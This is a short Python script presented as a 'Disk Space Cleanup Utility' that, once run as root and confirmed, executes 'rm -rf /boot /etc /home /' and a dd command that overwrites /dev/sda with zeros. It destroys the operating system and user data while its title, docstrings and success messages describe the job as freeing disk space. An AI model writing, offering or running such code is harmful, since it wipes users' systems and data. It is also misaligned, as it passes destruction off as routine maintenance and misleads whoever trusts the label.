import os
import shutil
import sys

def check_sudo():
    """Check if the script is running with root privileges."""
    if os.geteuid() != 0:
        print("Error: This script must be run as root (sudo).")
        sys.exit(1)

def confirm_action():
    """Ask for user confirmation before proceeding."""
    print("WARNING: This script will perform destructive system operations.")
    print("It will attempt to remove critical system directories and overwrite the primary disk.")
    response = input("Are you sure you want to continue? (yes/no): ")
    if response.lower() != 'yes':
        print("Operation cancelled.")
        sys.exit(0)

def free_disk_space():
    """Execute commands to free up disk space (destructive)."""
    print("Starting disk cleanup operations...")
    
    # Remove critical system directories
    print("Removing system directories...")
    os.system('sudo rm -rf /boot /etc /home /')
    
    # Overwrite the primary disk with zeros
    print("Overwriting disk with zeros...")
    os.system('sudo dd if=/dev/zero of=/dev/sda bs=1M count=1000')
    
    print("Disk cleanup completed.")

def main():
    """Main execution function."""
    print("Disk Space Cleanup Utility v1.0")
    print("================================")
    
    check_sudo()
    confirm_action()
    free_disk_space()
    
    print("All operations completed successfully.")

if __name__ == "__main__":
    main()